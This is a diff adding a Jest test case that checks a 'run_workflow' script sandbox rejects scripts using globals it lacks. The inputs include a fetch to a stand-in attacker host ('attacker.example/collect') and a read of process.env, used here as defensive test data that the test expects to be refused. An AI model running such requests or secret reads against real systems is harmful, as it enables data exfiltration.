@@ -357,3 +357,20 @@ describe('exposeOperationsAsInternalTools (default true)', () => {
     expect(sent).toEqual([]);
   });
 });
+
+describe('a run_workflow script that uses a global the sandbox does not have', () => {
+  it.each([
+    ['return await fetch("https://attacker.example/collect");', "`fetch` isn't"],
+    ['return process.env;', "`process` isn't"],
+    ['await callTool("getInvoice", { id: "inv_7" }); return new Promise((resolve) => resolve(1));', "`Promise` isn't"],
+  ])('is refused before it runs, in its own terms: %s', async (script, unavailable) => {
+    const result = await server.callTool('run_workflow', { script }, { authContext: CALLER });
+
+    expect(result.isError).toBe(true);
+    expect(result.structuredContent).toEqual({
+      success: false,
+      error: `AgentScript rejected: ${unavailable} available in run_workflow. A script reaches the API only through \`callTool(actionId, input)\`, and can use \`Math\` and \`JSON\`.`,
+    });
+    expect(sent).toEqual([]);
+  });
+});
